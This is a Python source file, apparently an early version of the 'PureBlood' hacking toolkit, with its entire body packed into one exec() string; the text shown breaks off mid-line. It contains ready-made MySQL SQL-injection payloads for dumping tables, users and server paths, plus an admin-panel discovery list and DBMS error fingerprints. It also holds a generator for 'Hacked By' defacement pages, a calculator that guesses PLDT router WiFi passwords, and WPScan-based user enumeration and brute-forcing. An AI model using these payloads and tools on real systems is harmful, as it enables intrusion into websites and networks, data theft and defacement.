#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
Script Created By:
    Cr4sHCoD3
Page:
    https://github.com/cr4shcod3
    https://github.com/cr4shcod3/pureblood
FB Page:
    https://facebook.com/cr4shcod3.py
Copyrights:
    Cr4sHCoD3 2018
    MIT LICENSE
Special Mentions:
    PureHackers PH
    Blood Security Hackers
"""
exec("""import os\nimport sys\nimport platform\nimport time\nimport datetime\nimport re\nimport threading\nimport socket\nimport webbrowser\nimport hashlib\nimport random\nimport subprocess\nimport zipfile\n\n\n\ntry:\n    import colorama\n    colorama.init()\nexcept:\n    print ('[!] - Module (colorama) not installed!')\n    sys.exit()\n\n\n\ntry:\n    import requests\n    from requests.exceptions import ConnectionError\nexcept:\n    print ('[!] - Module (requests) not installed!')\n    sys.exit()\n\n\n\ntry:\n    import whois\nexcept:\n    print ('[!] - Module (python-whois) not installed!')\n    sys.exit()\n\n\n\ntry:\n    import dns.resolver\nexcept:\n    print ('[!] - Module (dnspython) not installed!')\n    sys.exit()\n\n\n\ntry:\n    from bs4 import BeautifulSoup\nexcept:\n    print ('[!] - Module (bs4) not installed!')\n    sys.exit()\n\n\n\ntry:\n    import shodan\nexcept:\n    print ('[!] - Module (shodan) not installed!')\n    sys.exit()\n\n\n\n#########################################################################################################################################################\n# GLOBAL\n\nFNULL = open(os.devnull, 'w')\ngoogle_hacking = 'https://www.google.com/search?q='\ndios1 = '(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(InFoRMAtiON_sCHeMa.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c7374726f6e672069643d2250757265426c6f6f64223e5461626c653a20,TaBLe_nAMe,0x203d3d20,column_name,0x3c2f7374726f6e673e3c62723e))))a)'\nsqli_payload_hostname = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@hostname,0x3c2f7374726f6e673e)'\nsqli_payload_tmpdir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@tmpdir,0x3c2f7374726f6e673e)'\nsqli_payload_datadir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@datadir,0x3c2f7374726f6e673e)'\nsqli_payload_version = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@version,0x3c2f7374726f6e673e)'\nsqli_payload_basedir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@basedir,0x3c2f7374726f6e673e)'\nsqli_payload_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,user(),0x3c2f7374726f6e673e)'\nsqli_payload_database = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,database(),0x3c2f7374726f6e673e)'\nsqli_payload_schema = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,schema(),0x3c2f7374726f6e673e)'\nsqli_payload_uuid = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,UUID(),0x3c2f7374726f6e673e)'\nsqli_payload_system_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,system_user(),0x3c2f7374726f6e673e)'\nsqli_payload_session_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,session_user(),0x3c2f7374726f6e673e)'\nsqli_payload_symlink = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@GLOBAL.have_symlink,0x3c2f7374726f6e673e)'\nsqli_payload_ssl = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@GLOBAL.have_ssl,0x3c2f7374726f6e673e)'\nsqli_dump_column_payload = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,<column>,0x3c2f7374726f6e673e)'\n\n## Color\nreset = '\\033[0m'\nbold = '\\033[1m'\nunderline = '\\033[4m'\n### Fore\nblack = '\\033[90m'; red = '\\033[91m'; green = '\\033[92m'; yellow = '\\033[93m'; blue = '\\033[94m'; magenta = '\\033[95m'; cyan = '\\033[96m'; white = '\\033[97m'\n### Background\nbg_black = '\\033[90m'; bg_red = '\\033[91m'; bg_green = '\\033[92m'; bg_yellow = '\\033[93m'; bg_blue = '\\033[94m'; bg_magenta = '\\033[95m'; bg_cyan = '\\033[96m'; bg_white = '\\033[97m'\n\n## Configuration\nif platform.system() == 'Windows':\n    from ctypes import windll, create_string_buffer\n    h = windll.kernel32.GetStdHandle(-12)\n    csbi = create_string_buffer(22)\n    res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)\n    if res:\n        import struct\n        (bufx, bufy, curx, cury, wattr,\n        left, top, right, bottom, maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)\n        sizex = right - left + 1\n        sizey = bottom - top + 1\n    else:\n        sizex, sizey = 80, 25\nelif platform.system() == 'Linux' or platform.system() == 'Darwin':\n    sizey, sizex = os.popen('stty size', 'r').read().split()\nelse:\n    sizex = 50\n\n## Date Time\nmonth = datetime.date.today().strftime("%B")\nif datetime.date.today().strftime("%w") == 1 or datetime.date.today().strftime("%w") == '1':\n    day = 'Monday'\nelif datetime.date.today().strftime("%w") == 2 or datetime.date.today().strftime("%w") == '2':\n    day = 'Tuesay'\nelif datetime.date.today().strftime("%w") == 3 or datetime.date.today().strftime("%w") == '3':\n    day = 'Wednesday'\nelif datetime.date.today().strftime("%w") == 4 or datetime.date.today().strftime("%w") == '4':\n    day = 'Thursday'\nelif datetime.date.today().strftime("%w") == 5 or datetime.date.today().strftime("%w") == '5':\n    day = 'Friday'\nelif datetime.date.today().strftime("%w") == 6 or datetime.date.today().strftime("%w") == '6':\n    day = 'Saturday'\nelif datetime.date.today().strftime("%w") == 7 or datetime.date.today().strftime("%w") == '0':\n    day = 'Sunday'\nmday = datetime.date.today().strftime("%d")\nyear = datetime.date.today().strftime("%Y")\ncurrent_datetime = datetime.datetime.now()\ncurrent_time = current_datetime.strftime('%I:%M:%S')\n\n## List\nids = [\n    'NONE','A','NS','MD','MF','CNAME','SOA','MB','MG','MR','NULL','WKS','PTR','HINFO','MINFO','MX','TXT','RP','AFSDB','X25','ISDN','RT','NSAP','NSAP-PTR','SIG','KEY','PX','GPOS','AAAA','LOC','NXT','SRV','NAPTR','KX','CERT','A6','DNAME','OPT','APL','DS','SSHFP','IPSECKEY','RRSIG','NSEC','DNSKEY','DHCID','NSEC3','NSEC3PARAM','TLSA','HIP','CDS','CDNSKEY','CSYNC','SPF','UNSPEC','EUI48','EUI64','TKEY','TSIG','IXFR','AXFR','MAILB','MAILA','ANY','URI','CAA','TA','DLV'\n]\nadmin_panel_list = ['/admin.aspx','/admin.asp','/admin.php','/admin/','/administrator/','/moderator/','/webadmin/','/adminarea/','/bb-admin/','/adminLogin/','/admin_area/','/panel-administracion/','/instadmin/','/memberadmin/','/administratorlogin/','/adm/','/admin/account.php','/admin/index.php','/admin/login.php','/admin/admin.php','/admin/account.php','/joomla/administrator','/login.php','/admin_area/admin.php','/admin_area/login.php','/siteadmin/login.php','/siteadmin/index.php','/siteadmin/login.html','/admin/account.html','/admin/index.html','/admin/login.html','/admin/admin.html','/admin_area/index.php','/bb-admin/index.php','/bb-admin/login.php','/bb-admin/admin.php','/admin/home.php','/admin_area/login.html','/admin_area/index.html','/admin/controlpanel.php','/admincp/index.asp','/admincp/login.asp','/admincp/index.html','/admin/account.html','/adminpanel.html','/webadmin.html','webadmin/index.html','/webadmin/admin.html','/webadmin/login.html','/admin/admin_login.html','/admin_login.html','/panel-administracion/login.html','/admin/cp.php','cp.php','/administrator/index.php','/administrator/login.php','/nsw/admin/login.php','/webadmin/login.php','/admin/admin_login.php','/admin_login.php','/administrator/account.php','/administrator.php','/admin_area/admin.html','/pages/admin/admin-login.php','/admin/admin-login.php','/admin-login.php','/bb-admin/index.html','/bb-admin/login.html','/bb-admin/admin.html','/admin/home.html','/modelsearch/login.php','/moderator.php','/moderator/login.php','/moderator/admin.php','/account.php','/pages/admin/admin-login.html','/admin/admin-login.html','/admin-login.html','/controlpanel.php','/admincontrol.php','/admin/adminLogin.html','/adminLogin.html','/admin/adminLogin.html','/home.html','/rcjakar/admin/login.php','/adminarea/index.html','/adminarea/admin.html','/webadmin.php','/webadmin/index.php','/webadmin/admin.php','/admin/controlpanel.html','/admin.html','/admin/cp.html','cp.html','/adminpanel.php','/moderator.html','/administrator/index.html','/administrator/login.html','/user.html','/administrator/account.html','/administrator.html','/login.html','/modelsearch/login.html','/moderator/login.html','/adminarea/login.html','/panel-administracion/index.html','/panel-administracion/admin.html','/modelsearch/index.html','/modelsearch/admin.html','/admincontrol/login.html','/adm/index.html','/adm.html','/moderator/admin.html','/user.php','/account.html','/controlpanel.html','/admincontrol.html','/panel-administracion/login.php','/wp-login.php','/adminLogin.php','/admin/adminLogin.php','/home.php','/adminarea/index.php','/adminarea/admin.php','/adminarea/login.php','/panel-administracion/index.php','/panel-administracion/admin.php','/modelsearch/index.php','/modelsearch/admin.php','/admincontrol/login.php','/adm/admloginuser.php','/admloginuser.php','/admin2.php','/admin2/login.php','/admin2/index.php','adm/index.php','adm.php','affiliate.php','/adm_auth.php  ','/memberadmin.php','/administratorlogin.php','/login/admin.asp','/admin/login.asp','/administratorlogin.asp','/login/asmindstrator.asp','/admin/login.aspx','/login/admin.aspx','/administartorlogin.aspx','login/administrator.aspx','/adminlogin.asp','a/dminlogin.aspx','/admin_login.asp','/admin_login.aspx','/adminhome.asp','/adminhome.aspx''/administrator_login.asp','/administrator_login.aspx']\nadmin_panel_valid = []\n\ndbms_errors = {\n    'MySQL': (r'SQL syntax.*MySQL', r'Warning.*mysql_.*', r'MySQL Query fail.*', r'SQL syntax.*MariaDB server'),\n    'PostgreSQL': (r'PostgreSQL.*ERROR', r'Warning.*\\Wpg_.*', r'Warning.*PostgreSQL'),\n    'Microsoft SQL Server': (r'OLE DB.* SQL Server', r'(\\W|\\A)SQL Server.*Driver', r'Warning.*odbc_.*', r'Warning.*mssql_', r'Msg \\d+, Level \\d+, State \\d+', r'Unclosed quotation mark after the character string', r'Microsoft OLE DB Provider for ODBC Drivers'),\n    'Microsoft Access': (r'Microsoft Access Driver', r'Access Database Engine', r'Microsoft JET Database Engine', r'.*Syntax error.*query expression'),\n    'Oracle': (r'\\bORA-[0-9][0-9][0-9][0-9]', r'Oracle error', r'Warning.*oci_.*', 'Microsoft OLE DB Provider for Oracle'),\n    'IBM DB2': (r'CLI Driver.*DB2', r'DB2 SQL error'),\n    'SQLite': (r'SQLite/JDBCDriver', r'System.Data.SQLite.SQLiteException'),\n    'Informix': (r'Warning.*ibase_.*', r'com.informix.jdbc'),\n    'Sybase': (r'Warning.*sybase.*', r'Sybase message')\n}\n\n## Threading Object Funtions\ndef TCP_connect(ip, port_number, delay, output):\n    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    TCPsock.settimeout(delay)\n    try:\n        TCPsock.connect((ip, port_number))\n        output[port_number] = 'Open'\n    except:\n        output[port_number] = ''\n\ndef dns_record_scanner(drs_hostname, ids_item, dns_record_list):\n    try:\n        answers = dns.resolver.query(drs_hostname, ids_item)\n        for rdata in answers:\n            ids_item = str(ids_item); rdata = str(rdata)\n            dns_record_list.append(str(ids_item + ' : ' + rdata))\n    except Exception:\n        pass\n\ndef subdomain_scanner(subdomain, so_200, so_301, so_302, so_403):\n    subdomain = 'http://' + subdomain\n    try:\n        subdomain_scanner_request = requests.get(subdomain)\n        subdomain_scanner_code = subdomain_scanner_request.status_code\n        if subdomain_scanner_code == 200:\n            so_200.append(subdomain)\n        elif subdomain_scanner_code == 301:\n            so_301.append(subdomain)\n        elif subdomain_scanner_code == 302:\n            so_302.append(subdomain)\n        elif subdomain_scanner_code == 403:\n            so_403.append(subdomain)\n    except ConnectionError:\n        pass\n\ndef directory_scanner(ds_url_list, directory_fuzz_final1, directory_fuzz_final2, directory_fuzz_final3):\n    try:\n        directory_fuzz_request = requests.get(ds_url_list)\n        if directory_fuzz_request.status_code == 200:\n            directory_fuzz_final1.append(ds_url_list)\n        elif directory_fuzz_request.status_code == 301 or directory_fuzz_request.status_code == 302:\n            directory_fuzz_final2.append(ds_url_list)\n        elif directory_fuzz_request.status_code == 403:\n            directory_fuzz_final3.append(ds_url_list)\n    except:\n        pass\n\ndef file_scanner(fs_url_list, file_fuzz_final1, file_fuzz_final2, file_fuzz_final3):\n    try:\n        file_fuzz_request = requests.get(fs_url_list)\n        if file_fuzz_request.status_code == 200:\n            file_fuzz_final1.append(fs_url_list)\n        elif file_fuzz_request.status_code == 301 or file_fuzz_request.status_code == 302:\n            file_fuzz_final2.append(fs_url_list)\n        elif file_fuzz_request.status_code == 403:\n            file_fuzz_final3.append(fs_url_list)\n    except:\n        pass\n# END GLOBAL\n#########################################################################################################################################################\n\nclass Generator:\n    def deface_page(self, title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups):\n        deface_page_template = '''\n<html>\n<head>\n  <title>--=[ Hacked By {0} ]=--</title>\n  <meta charset=\\"UTF-8\\">\n  <link rel=\\"SHORTCUT ICON\\" href=\\"{1}\\">\n  <meta name=\\"Author\\" content=\\"Cr4sHCoD3 | PureHackers x Blood Security Hackers\\"/>\n  <meta name=\\"copyright\\" content=\\"PureHackers | Blood Security Hackers\\"/>\n  <meta name=\\"description\\" content=\\"{2}.\\"/> <!-- Change this -->\n  <meta name=\\"keywords\\" content=\\"Hacked, Pawned, Defaced, Security, PureHackers, Blood Security Hackers, PureBlood, Cr4sHCoD3\\"/> <!-- Change this -->\n  <meta property=\\"og:title\\" content=\\"Hacked By {0}\\"/>\n  <meta property=\\"og:image\\" content=\\"{3}\\"> <!-- Change this -->\n\n  <style>\n  {9} url(\\"https://cr4shcod3.github.io/python/pureblood/pureblood.css\\");\n  </style>\n</head>\n<body>\n  <div class=\\"bg\\">\n    <center>\n      <img src=\\"{4}\\" class=\\"logo\\"/> <!-- Change This -->\n      <h1 class=\\"header glitch\\" data-text=\\"Hacked By {5}\\">Hacked By {5}</h1><br><br>\n      <p class=\\"message\\">{6}</p>\n      <p class=\\"message\\">{7}</p><br><br>\n      <p class=\\"groups\\">Greetings: {8}</p>\n    </center>\n  </div>\n</body>\n</html>\n'''.format(title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups, '@import')\n        self.deface_page_result = deface_page_template\n        return self.deface_page_result\n\n    def password_generator(self, length, text):\n        password_generator_final1 = ''\n        password_generator_final2 = ''\n        password_generator_final3 = ''\n        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_=+[{}];:\\'"\\|,<.>/?`~'\n        for i in range(length):\n            char_random = random.choice(chars)\n            password_generator_final1 += char_random\n        password_generator_final2 = hashlib.md5(text.encode('utf-8')).hexdigest()\n        l33t_alphabet = ['4','8','(','|)','3','|=','9','#','1','_|','|<','|_','|\\/|','|\\|','0','|D','(,)','|2','$','7','|_|','\\/','\\/\\/','><','\\'/','(/)']\n        for i in text:\n            if i == 'a' or i == 'A':\n                text = text.replace('a', l33t_alphabet[0]).replace('A', l33t_alphabet[0])\n            elif i == 'b' or i == 'B':\n                text = text.replace('b', l33t_alphabet[1]).replace('B', l33t_alphabet[1])\n            elif i == 'c' or i == 'C':\n                text = text.replace('c', l33t_alphabet[2]).replace('C', l33t_alphabet[2])\n            elif i == 'd' or i == 'D':\n                text = text.replace('d', l33t_alphabet[3]).replace('D', l33t_alphabet[3])\n            elif i == 'e' or i == 'E':\n                text = text.replace('e', l33t_alphabet[4]).replace('E', l33t_alphabet[4])\n            elif i == 'f' or i == 'F':\n                text = text.replace('f', l33t_alphabet[5]).replace('F', l33t_alphabet[5])\n            elif i == 'g' or i == 'G':\n                text = text.replace('g', l33t_alphabet[6]).replace('G', l33t_alphabet[6])\n            elif i == 'h' or i == 'H':\n                text = text.replace('h', l33t_alphabet[7]).replace('H', l33t_alphabet[7])\n            elif i == 'i' or i == 'I':\n                text = text.replace('i', l33t_alphabet[8]).replace('I', l33t_alphabet[8])\n            elif i == 'j' or i == 'J':\n                text = text.replace('j', l33t_alphabet[9]).replace('J', l33t_alphabet[9])\n            elif i == 'k' or i == 'K':\n                text = text.replace('k', l33t_alphabet[10]).replace('K', l33t_alphabet[10])\n            elif i == 'l' or i == 'L':\n                text = text.replace('l', l33t_alphabet[11]).replace('L', l33t_alphabet[11])\n            elif i == 'm' or i == 'M':\n                text = text.replace('m', l33t_alphabet[12]).replace('M', l33t_alphabet[12])\n            elif i == 'n' or i == 'N':\n                text = text.replace('n', l33t_alphabet[13]).replace('N', l33t_alphabet[13])\n            elif i == 'o' or i == 'O':\n                text = text.replace('o', l33t_alphabet[14]).replace('O', l33t_alphabet[14])\n            elif i == 'p' or i == 'P':\n                text = text.replace('p', l33t_alphabet[15]).replace('P', l33t_alphabet[15])\n            elif i == 'q' or i == 'Q':\n                text = text.replace('q', l33t_alphabet[16]).replace('Q', l33t_alphabet[16])\n            elif i == 'r' or i == 'R':\n                text = text.replace('r', l33t_alphabet[17]).replace('R', l33t_alphabet[17])\n            elif i == 's' or i == 'S':\n                text = text.replace('s', l33t_alphabet[18]).replace('S', l33t_alphabet[18])\n            elif i == 't' or i == 'T':\n                text = text.replace('t', l33t_alphabet[19]).replace('T', l33t_alphabet[19])\n            elif i == 'u' or i == 'U':\n                text = text.replace('u', l33t_alphabet[20]).replace('U', l33t_alphabet[20])\n            elif i == 'v' or i == 'V':\n                text = text.replace('v', l33t_alphabet[21]).replace('V', l33t_alphabet[21])\n            elif i == 'w' or i == 'W':\n                text = text.replace('w', l33t_alphabet[22]).replace('W', l33t_alphabet[22])\n            elif i == 'x' or i == 'X':\n                text = text.replace('x', l33t_alphabet[23]).replace('X', l33t_alphabet[23])\n            elif i == 'y' or i == 'Y':\n                text = text.replace('y', l33t_alphabet[24]).replace('Y', l33t_alphabet[24])\n            elif i == 'z' or i == 'Z':\n                text = text.replace('z', l33t_alphabet[25]).replace('Z', l33t_alphabet[25])\n        password_generator_final3 = text\n        self.password_generator_result1 = password_generator_final1\n        self.password_generator_result2 = password_generator_final2\n        self.password_generator_result3 = password_generator_final3\n        return self.password_generator_result1, self.password_generator_result2, self.password_generator_result3\n\n    def pldt_password_calculator(self, digit5, mac5):\n        pldt_password_calculator_final1 = ['PLDTWIFI' + digit5, 'pldtwifi'+ digit5]\n        pldt_password_calculator_final2_multiply = digit5 * 3\n        pldt_password_calculator_final2 = ['PLDTWIFI' + pldt_password_calculator_final2_multiply, 'pldtwifi' + pldt_password_calculator_final2_multiply]\n        digit55 = digit5\n        for i in digit55:\n            if i == '0':\n                digit55.replace('0', 'f')\n            elif i == '4':\n                digit55.replace('4', 'b')\n            elif i == '8':\n                digit55.replace('8', '7')\n            elif i == 'c':\n                digit55.replace('c', '3')\n            elif i == '1':\n                digit55.replace('1', 'e')\n            elif i == '5':\n                digit55.replace('5', 'a')\n            elif i == '9':\n                digit55.replace('9', '6')\n            elif i == 'd':\n                digit55.replace('d', '2')\n            elif i == '2':\n                digit55.replace('2', 'd')\n            elif i == '6':\n                digit55.replace('6', '9')\n            elif i == 'a':\n                digit55.replace('a', '5')\n            elif i == 'e':\n                digit55.replace('e', '1')\n            elif i == '3':\n                digit55.replace('3', 'c')\n            elif i == '7':\n                digit55.replace('7', '8')\n            elif i == 'b':\n                digit55.replace('b', '4')\n            elif i == 'f':\n                digit55.replace('f', '0')\n        pldt_password_calculator_final3 = 'wlan' + digit55\n        pldt_password_calculator_final4 = ['PLDTWIFI' + digit55, 'pldtwifi' + digit55]\n        pldt_password_calculator_final5 = 'HomeBro_' + mac5\n        self.pldt_password_calculator_result1 = pldt_password_calculator_final1\n        self.pldt_password_calculator_result2 = pldt_password_calculator_final2\n        self.pldt_password_calculator_result3 = pldt_password_calculator_final3\n        self.pldt_password_calculator_result4 = pldt_password_calculator_final4\n        self.pldt_password_calculator_result5 = pldt_password_calculator_final5\n        return self.pldt_password_calculator_result1, self.pldt_password_calculator_result2, self.pldt_password_calculator_result3, self.pldt_password_calculator_result4, self.pldt_password_calculator_result5\n\n    def text_to_hash(self, text):\n        md5_final = hashlib.md5(text.encode('utf-8')).hexdigest()\n        sha1_final = hashlib.sha1(text.encode('utf-8')).hexdigest()\n        sha224_final = hashlib.sha224(text.encode('utf-8')).hexdigest()\n        sha256_final = hashlib.sha256(text.encode('utf-8')).hexdigest()\n        sha384_final = hashlib.sha384(text.encode('utf-8')).hexdigest()\n        sha512_final = hashlib.sha512(text.encode('utf-8')).hexdigest()\n        md4 = hashlib.new('md4')\n        md4.update(text.encode('utf-8'))\n        md4_final = md4.hexdigest()\n        ripemd160 = hashlib.new('ripemd160')\n        ripemd160.update(text.encode('utf-8'))\n        ripemd160_final = ripemd160.hexdigest()\n        whirlpool = hashlib.new('whirlpool')\n        whirlpool.update(text.encode('utf-8'))\n        whirlpool_final = whirlpool.hexdigest()\n        text_to_hash_final = \"\"\"\nText To Hash Result:\n[+] MD4: {0}\n[+] MD5: {1}\n[+] SHA1: {2}\n[+] SHA224: {3}\n[+] SHA256: {4}\n[+] SHA384: {5}\n[+] SHA512: {6}\n[+] RipeMD160: {7}\n[+] Whirlpool: {8}\n\"\"\".format(md4_final, md5_final, sha1_final, sha224_final, sha256_final, sha384_final, sha512_final, ripemd160_final, whirlpool_final)\n        self.text_to_hash_result = text_to_hash_final\n        return self.text_to_hash_result\n\n\n\nclass WebApplicationAttack:\n    def wp_scan(self, url):\n        wp_scan_test_ruby_command = subprocess.call('ruby --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n        if wp_scan_test_ruby_command == 0:\n            pass\n        elif wp_scan_test_ruby_command == 1:\n            print ('\\n{2}[{1}!{2}] {3}- {1}Please install ruby first!{0}'.format(reset, red, blue, yellow))\n            print ('Ruby Installer: https://rubyinstaller.org/')\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n        if platform.system() == 'Windows':\n            if not os.path.exists('external/wpscan-master'):\n                wp_scan_download_curl = subprocess.call('curl -LO https://github.com/wpscanteam/wpscan/archive/master.zip', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n                if wp_scan_download_curl == 0:\n                    wp_scan_unzip = zipfile.ZipFile('master.zip', 'r')\n                    wp_scan_unzip.extractall('external/')\n                    wp_scan_unzip.close()\n                    os.remove('master.zip')\n                elif wp_scan_download_curl == 1:\n                    if os.path.exists('external/wpscan'):\n                        os.rename('external/wpscan', 'external/wpscan-master')\n                    else:\n                        wp_scan_download_git = subprocess.call('cd external/ && git clone https://github.com/wpscanteam/wpscan', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n                        if wp_scan_download_git == 0:\n                            os.rename('external/wpscan', 'external/wpscan-master')\n                        elif wp_scan_download_git == 1:\n                            print ('\\n{2}[{1}!{2}] {3}- {1}Please install curl or git for windows first!{0}'.format(reset, red, blue, yellow))\n                            print ('Tutorial: http://www.oracle.com/webfolder/technetwork/tutorials/obe/cloud/objectstorage/restrict_rw_accs_cntainers_REST_API/files/installing_curl_command_line_tool_on_windows.html')\n                            time.sleep(2)\n                            print ('')\n                            web_application_attack()\n            else:\n                pass\n            wp_scan = subprocess.call('ruby external/wpscan-master/wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n            if wp_scan != 0:\n                print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan\\'s dependencies first!{0}'.format(reset, red, blue, yellow))\n                print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n            else:\n                pass\n        else:\n            wp_scan = subprocess.call('wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n            if wp_scan != 0:\n                print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan\\'s dependencies first!{0}'.format(reset, red, blue, yellow))\n                print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n            else:\n                pass\n        if wp_scan == 0:\n            pass\n        elif wp_scan == 1:\n            print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan first!{0}'.format(reset, red, blue, yellow))\n            print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n        if platform.system() == 'Windows':\n            print ('[#] - Updating WPScan:')\n            subprocess.call('ruby external/wpscan-master/wpscan --batch --no-banner --no-color --update --disable-tls-checks', shell=True)\n            print ('\\n[#] - Running WPScan:')\n            if sys.version_info[0] == 3:\n                wp_scan_user_range = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))\n            elif sys.version_info[0] == 2:\n                wp_scan_user_range = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))\n            try:\n                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 -e u['+wp_scan_user_range+'],p,tt', shell=True)\n            except Exception as e:\n                print ('[!] - Error: {0}'.format(e))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n        else:\n            print ('[#] - Updating WPScan:')\n            subprocess.call('wpscan --batch --no-banner --update --disable-tls-checks', shell=True)\n            print ('\\n[#] - Running WPScan:')\n            if sys.version_info[0] == 3:\n                wp_scan_user_range = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))\n            elif sys.version_info[0] == 2:\n                wp_scan_user_range = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))\n            try:\n                subprocess.call('wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 -e u['+wp_scan_user_range+'],p,tt', shell=True)\n            except Exception as e:\n                print ('[!] - Error: {0}'.format(e))\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n\n    def wp_scan_bruteforce(self, url):\n        wp_scan_test_ruby_command = subprocess.call('ruby --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n        if wp_scan_test_ruby_command == 0:\n            pass\n        elif wp_scan_test_ruby_command == 1:\n            print ('\\n{2}[{1}!{2}] {3}- {1}Please install ruby first!{0}'.format(reset, red, blue, yellow))\n            print ('Ruby Installer: https://rubyinstaller.org/')\n            time.sleep(2)\n            print ('')\n            web_application_attack()\n        if platform.system() == 'Windows':\n            if not os.path.exists('external/wpscan-master'):\n                wp_scan_download_curl = subprocess.call('curl -LO https://github.com/wpscanteam/wpscan/archive/master.zip', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n                if wp_scan_download_curl == 0:\n                    wp_scan_unzip = zipfile.ZipFile('master.zip', 'r')\n                    wp_scan_unzip.extractall('external/')\n                    wp_scan_unzip.close()\n                    os.remove('master.zip')\n                elif wp_scan_download_curl == 1:\n                    if os.path.exists('external/wpscan'):\n                        os.rename('external/wpscan', 'external/wpscan-master')\n                    else:\n                        wp_scan_download_git = subprocess.call('cd external/ && git clone https://github.com/wpscanteam/wpscan', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n                        if wp_scan_download_git == 0:\n                            os.rename('external/wpscan', 'external/wpscan-master')\n                        elif wp_scan_download_git == 1:\n                            print ('\\n{2}[{1}!{2}] {3}- {1}Please install curl or git for windows first!{0}'.format(reset, red, blue, yellow))\n                            print ('Tutorial: http://www.oracle.com/webfolder/technetwork/tutorials/obe/cloud/objectstorage/restrict_rw_accs_cntainers_REST_API/files/installing_curl_command_line_tool_on_windows.html')\n                            time.sleep(2)\n                            print ('')\n                            web_application_attack()\n            else:\n                pass\n            wp_scan = subprocess.call('ruby external/wpscan-master/wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)\n            if wp_scan != 0:\n                print ('\\n{2}[{1}!{2}] {3}- {1}Please install wpscan\\'s dependencies first!{0}'.format(reset, red, blue, yellow))\n                print (\"\"\"\nLinux / MAC OS:\nhttps://wpscan.org\nAndroid:\n    Termux / GNURoot\nWindows:\nhttp://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10\nhttps://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html\nKali Linux:\nsudo apt-get install wpscan\"\"\")\n                time.sleep(2)\n                print ('')\n                web_application_attack()\n            else:\n                pass\n        else:\n            wp_scan = subprocess.call('wpscan --version', shell=True, stdout=FNULL, 